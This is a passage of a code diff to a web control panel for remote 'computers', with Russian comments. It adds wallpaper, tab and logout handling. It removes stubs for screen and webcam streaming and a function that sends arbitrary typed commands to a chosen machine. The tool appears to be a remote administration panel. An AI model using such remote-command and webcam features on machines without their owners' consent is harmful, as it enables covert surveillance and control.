+        if (type === 'url') data = document.getElementById('wallpaperUrl').value;
+        else data = document.getElementById('wallpaperColor').value;
+        
+        const resp = await fetch('/api/panel/wallpaper', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type, data })
+        });
+        if (resp.ok) {
+            if (type === 'url') {
+                document.body.style.backgroundImage = `url(${data})`;
+                document.body.style.backgroundSize = 'cover';
+            } else {
+                document.body.style.backgroundImage = 'none';
+                document.body.style.backgroundColor = data;
+            }
+            closeModal('wallpaperModal');
             alert('Wallpaper changed');
-        } else alert('Error');
+        }
     }
     
-    async function startScreen(id){ currentComputerId=id; document.getElementById('streamModal')?.remove(); alert('Stream requires full WebRTC implementation'); }
-    async function startWebcam(id){ alert('Stream requires full WebRTC implementation'); }
-    async function openFileManager(id){ alert('File manager ready in previous version'); }
-    async function sendCmd(id){ const cmd=prompt('Command:'); if(cmd){ const r=await fetch(`/api/command/${id}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd})}); if(r.ok){ const d=await r.json(); alert(d.output||'Done'); } else alert('Failed'); } }
-    async function logout(){ await fetch('/api/logout',{method:'POST'}); window.location.href='/login.html'; }
+    // ========== ВСПОМОГАТЕЛЬНЫЕ ==========
+    function openModal(id) { document.getElementById(id).style.display = 'block'; }
+    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
     
-    document.querySelectorAll('.tab').forEach(t=>{ t.addEventListener('click',()=>{ currentTab=t.dataset.tab; document.querySelectorAll('.tab').forEach(tt=>tt.classList.remove('active')); t.classList.add('active'); if(currentTab==='users') loadUsers(); else loadComputers(); }); });
+    async function logout() {
+        await fetch('/api/logout', { method: 'POST' });
+        window.location.href = '/login.html';
+    }
     
-    checkAuth(); connectSocket(); loadComputers(); setInterval(()=>{ if(currentTab!=='users') loadComputers(); }, 10000);
+    // ========== ВКЛАДКИ ==========
+    document.querySelectorAll('.tab').forEach(tab => {
+        tab.addEventListener('click', () => {
+            currentTab = tab.dataset.tab;
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            tab.classList.add('active');
+            if (currentTab === 'users') loadUsers();
+            else if (currentTab === 'settings') renderSettings();
+            else loadComputers();
+        });
+    });
+    
+    // ========== ЗАПУСК ==========
+    checkAuth();
+    connectSocket();
+    loadComputers();
+    setInterval(() => { if (currentTab !== 'users') loadComputers(); }, 10000);
 </script>
 </body>
 </html>
